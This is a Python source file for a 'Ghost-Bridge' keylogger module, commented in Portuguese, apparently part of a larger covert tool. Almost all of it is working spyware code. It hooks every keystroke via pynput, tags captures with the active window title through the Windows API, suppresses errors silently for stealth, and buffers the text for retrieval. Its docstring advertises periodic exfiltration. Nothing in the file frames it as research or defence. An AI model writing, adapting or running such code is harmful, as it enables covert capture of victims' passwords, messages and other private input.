"""
Ghost-Bridge - Keylogger Module
Captura teclas pressionadas de forma stealth.
"""
import threading
import time
import os
from datetime import datetime

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False


class Keylogger:
    """
    Keylogger stealth com buffer e exfiltração periódica.
    
    Features:
    - Captura todas as teclas (incluindo especiais)
    - Buffer local até atingir threshold
    - Detecção de janela ativa (contexto)
    - Suporte a caracteres especiais/acentos
    """
    
    def __init__(self, buffer_size=500, log_file=None):
        """
        Args:
            buffer_size: Número de caracteres antes de flush
            log_file: Arquivo local para backup (opcional)
        """
        if not PYNPUT_AVAILABLE:
            raise ImportError("[!] pynput não instalado. Execute: pip install pynput")
        
        self.buffer_size = buffer_size
        self.log_file = log_file
        self.buffer = ""
        self.running = False
        self.listener = None
        self.lock = threading.Lock()
        self.current_window = ""
        
    def _get_active_window(self):
        """Retorna o título da janela ativa (contexto)."""
        try:
            import ctypes
            from ctypes import wintypes
            
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            
            length = user32.GetWindowTextLengthW(hwnd)
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buffer, length + 1)
            
            return buffer.value
        except:
            return "Unknown"
    
    def _on_key_press(self, key):
        """Callback para cada tecla pressionada."""
        try:
            # Detecta mudança de janela
            window = self._get_active_window()
            if window != self.current_window:
                self.current_window = window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with self.lock:
                    self.buffer += f"\n\n[{timestamp}] [{window}]\n"
            
            # Processa a tecla
            with self.lock:
                if hasattr(key, 'char') and key.char:
                    self.buffer += key.char
                else:
                    # Teclas especiais
                    key_name = str(key).replace("Key.", "")
                    special_keys = {
                        'space': ' ',
                        'enter': '\n',
                        'tab': '\t',
                        'backspace': '[⌫]',
                        'shift': '',
                        'shift_r': '',
                        'ctrl_l': '[CTRL]',
                        'ctrl_r': '[CTRL]',
                        'alt_l': '[ALT]',
                        'alt_gr': '[ALT]',
                        'caps_lock': '[CAPS]',
                    }
                    self.buffer += special_keys.get(key_name, f'[{key_name}]')
            
        except Exception as e:
            pass  # Silencioso em produção
    
    def start(self):
        """Inicia o keylogger em background."""
        if self.running:
            return
        
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        
        print("[+] Keylogger iniciado")
    
    def stop(self):
        """Para o keylogger."""
        self.running = False
        if self.listener:
            self.listener.stop()
        print("[+] Keylogger parado")
    
    def get_logs(self, clear=True):
        """
        Retorna os logs capturados.
        
        Args:
            clear: Se True, limpa o buffer após retornar
            
        Returns:
            String com as teclas capturadas
        """
        with self.lock:
            logs = self.buffer
            if clear:
                self.buffer = ""
            
            # Salva backup local se configurado
            if self.log_file and logs:
                try:
                    with open(self.log_file, 'a', encoding='utf-8') as f:
                        f.write(logs)
                except:
                    pass
            
            return logs
    
    def get_buffer_size(self):
        """Retorna o tamanho atual do buffer."""
        with self.lock:
            return len(self.buffer)


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste do Keylogger - Pressione teclas (Ctrl+C para parar)")
    kl = Keylogger()
    kl.start()
    
    try:
        while True:
            time.sleep(5)
            logs = kl.get_logs()
            if logs:
                print(f"[Capturado]: {logs}")
    except KeyboardInterrupt:
        kl.stop()
